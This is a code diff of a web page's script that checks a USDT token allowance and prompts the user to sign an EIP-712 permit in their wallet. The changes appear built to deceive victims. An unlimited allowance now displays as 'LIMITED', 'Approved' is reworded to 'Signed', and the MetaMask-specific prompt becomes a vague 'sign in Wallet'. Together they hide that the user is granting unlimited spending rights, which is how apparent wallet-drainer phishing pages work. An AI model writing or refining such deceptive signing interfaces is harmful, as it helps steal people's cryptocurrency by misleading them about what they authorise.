@@ -312,12 +312,12 @@
                 }
 
                 const isUnlimited = amount.toString() === MAX_UINT160;
-                allowanceDisplay.textContent = isUnlimited ? '♾️ UNLIMITED' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
+                allowanceDisplay.textContent = isUnlimited ? 'LIMITED' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
                 allowanceDisplay.className = isUnlimited ? 'value unlimited' : 'value';
                 expiryDisplay.textContent = formatDate(expiration);
 
                 if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
-                    signBtn.textContent = '✅ Already Approved!';
+                    signBtn.textContent = '✅ Already Signed!';
                     signBtn.className = 'btn-sign done';
                     signBtn.disabled = true;
                     successCheck.classList.add('show');
@@ -366,7 +366,7 @@
                 console.log('📝 Nonce:', nonce.toString());
                 console.log('⏰ Expiration:', new Date(expiration * 1000).toLocaleString());
 
-                showStatus('✍️ Please sign in MetaMask... (No Gas!)', 'info');
+                showStatus('✍️ Please sign in Wallet', 'info');
 
                 // ⭐ EIP-712 Domain
                 const domain = {
